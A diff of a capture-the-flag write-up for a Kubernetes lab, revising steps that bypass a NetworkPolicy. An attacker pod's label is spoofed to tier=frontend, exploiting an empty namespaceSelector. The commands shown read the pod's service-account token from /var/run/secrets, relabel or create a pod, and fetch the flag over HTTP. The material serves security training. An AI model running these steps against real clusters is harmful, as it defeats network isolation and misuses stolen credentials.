@@ -31,8 +31,9 @@
 ```
 Attacker pod blocked by NetworkPolicy (requires tier=frontend label)
   → Discover NetworkPolicy label requirement
-  → Create new pod with tier=frontend label in isolated-ns
-  → Access flag-service from bypass pod → Read flag
+  → Policy trusts the label from ANY namespace (namespaceSelector: {})
+  → Label the attacker's own pod tier=frontend inside attacker-ns
+  → Access flag-service from the spoofed pod → Read flag
 ```
 
 ## Step-by-Step Exploitation
@@ -55,27 +56,28 @@ kubectl get networkpolicy -n isolated-ns protect-flag -o yaml
 ### Step 3: Bypass via Matching Pod
 
 ```bash
-# Create a pod with the required label in the target namespace
-kubectl run bypass-pod --image=alpine:latest -n isolated-ns \
+# The policy's namespaceSelector: {} trusts tier=frontend from ANY namespace.
+# The attacker only needs to spoof the label inside their own tenant.
+TOKEN=$(kubectl exec -n attacker-ns attacker-pod -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# Option A: label the existing attacker pod
+kubectl --token=$TOKEN label pod attacker-pod -n attacker-ns tier=frontend --overwrite
+
+# Option B: create a new pod carrying the label
+kubectl --token=$TOKEN run bypass-pod --image=alpine:latest -n attacker-ns \
   --labels='tier=frontend' -- sleep 3600
 
 # Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/bypass-pod -n isolated-ns --timeout=30s
+kubectl --token=$TOKEN wait --for=condition=Ready pod/bypass-pod -n attacker-ns --timeout=30s
 ```
 
 ### Step 4: Access Flag Service from Bypass Pod
 
 ```bash
-kubectl exec -n isolated-ns bypass-pod -- wget -qO- \
+kubectl exec -n attacker-ns attacker-pod -- wget -qO- \
   http://flag-service.isolated-ns.svc.cluster.local:8080/flag
 # Output: flag{k8s-27-<16-hex>}
-```
-
-### Alternative: Read Flag from Flag Pod Directly
-
-```bash
-FLAG_POD=$(kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}')
-kubectl exec -n isolated-ns $FLAG_POD -- cat /tmp/flag.txt
 ```
 
 ## Flag Location
@@ -89,6 +91,9 @@ cd cve_challenges/scenarios/k8s/networkpolicy-bypass && bash deploy.sh
 kubectl exec -n isolated-ns -l app=flag-service -- cat /tmp/flag.txt
 bash teardown.sh
 ```
+
+> 前置：本场景安装 Calico（kind 默认 CNI 不强制 NetworkPolicy），部署脚本会在
+> 建集群后自动安装并等待就绪。攻击者的 RBAC 被限制在 attacker-ns 内。
 
 ## 此场景利用了哪些知识
 
